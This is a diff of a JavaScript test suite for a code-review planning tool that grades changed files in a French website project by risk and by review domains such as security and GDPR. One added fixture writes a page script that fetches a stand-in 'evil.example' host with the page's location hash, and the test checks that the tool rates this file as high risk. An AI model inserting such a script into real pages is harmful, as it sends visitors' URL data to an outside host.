@@ -78,7 +78,7 @@ const BYPASSES = [
   ['hosting and processor in a messages module', p => p.replace('src/lib/messages.ts', 'Bienvenue sur le site', 'Hébergé aux États-Unis par un prestataire américain'), ALL],
   ['e-mail template', p => p.replace('src/lib/emails/templates.ts', 'Votre compte est fermé', 'Vos messages seront conservés trois ans'), ['securite', 'rgpd']],
   ['processor promise', p => p.replace('src/lib/content/sous-traitance.ts', 'Nos partenaires ne reçoivent rien de vous', 'Nos sous-traitants ne reçoivent aucune donnée vous concernant'), ALL],
-  ['fixture with a real address', p => p.replace('fixtures/users.ts', '[]', "[{ name: 'Jean Dupont', mail: 'jean.dupont@gmail.com' }]"), ['securite', 'rgpd']],
+  ['fixture with a real address', p => p.replace('fixtures/users.ts', '[]', "[{ name: 'Jean Dupont', mail: 'jean.dupont@gmail.com' }]"), ALL],
   ['tracker in a cookie page', p => p.replace('src/routes/politique-cookies/+page.svelte', 'Ce site est léger', "Ce site n'utilise aucun traceur"), ['securite', 'fidelite', 'rgpd']],
 ];
 
@@ -134,6 +134,54 @@ test('review risk: a word of data or GDPR makes a test or a document of high ris
   r.edit('src/routes/blog/+page.md', '# Article\n');
   r.commit();
   assert.equal((await r.plan()).risk.level, 'eleve');
+});
+
+test('review risk: instructions of the agents and unclassified Markdown are of high risk, and the plan stays valid (no REVIEW_RISK)', async t => {
+  for (const [path, domains] of [
+    ['agents/architecte-donnees.md', ALL], ['workflows/revues.md', ALL], ['articles/premier.md', ALL], ['skills/review/SKILL.md', ALL],
+    ['.apv/brief.md', ALL], ['CLAUDE.md', ALL],
+  ]) {
+    const p = project(t);
+    p.edit(path, '# Consigne\n\nUne ligne ajoutée.\n');
+    p.commit();
+    const r = await apv(p.repo, ['review', 'plan', '--base', 'main', '--head', 'work', '--json']);
+    assert.equal(r.code, 0, `${path} : ${r.stderr}`);
+    assert.doesNotMatch(r.stderr, /REVIEW_RISK/, path);
+    const plan = r.json();
+    assert.equal(plan.risk.level, 'eleve', path);
+    assert.deepEqual(plan.retained, domains, path);
+  }
+});
+
+test('review risk: tooling outside a test folder, and tests under a routing folder, are never tests', async t => {
+  for (const [path, text, domains] of [
+    ['src/lib/fixtures/demo.ts', "export const demo = { role: 'owner' };\n", ALL],
+    ['src/lib/__mocks__/session.ts', 'export const session = { valid: true };\n', ALL],
+    ['src/routes/tests/+page.svelte', '<script>fetch("https://evil.example/" + location.hash)</script>\n', ['securite', 'fidelite']],
+    ['src/routes/tests/helpers.ts', 'export const allow = true;\n', ALL],
+  ]) {
+    const p = project(t);
+    p.edit(path, text);
+    p.commit();
+    const plan = await p.plan();
+    assert.equal(plan.risk.level, 'eleve', path);
+    assert.deepEqual(plan.retained, domains, path);
+    assert.notEqual(plan.files.find(f => f.path === path).riskWhy, 'tests', path);
+  }
+  // Tooling under the test folder at the root of the repository: a test.
+  const q = project(t);
+  q.edit('tests/fixtures/users.ts', "export const users = [{ name: 'Demo' }];\n");
+  q.commit();
+  const plan = await q.plan();
+  assert.equal(plan.risk.level, 'faible', JSON.stringify(plan.risk));
+  assert.deepEqual(plan.retained, ['securite']);
+  // A JSON file of the server class: « code serveur ou configuration ».
+  const r = project(t);
+  r.edit('.claude-plugin/plugin.json', '{ "name": "x" }\n');
+  r.edit('src/lib/settings.json', '{ "a": 1 }\n');
+  r.commit();
+  const why = (await r.plan()).files.find(f => f.path === 'src/lib/settings.json').riskWhy;
+  assert.equal(why, 'code serveur ou configuration');
 });
 
 test('review risk: --force and review.always stay above the level', async t => {
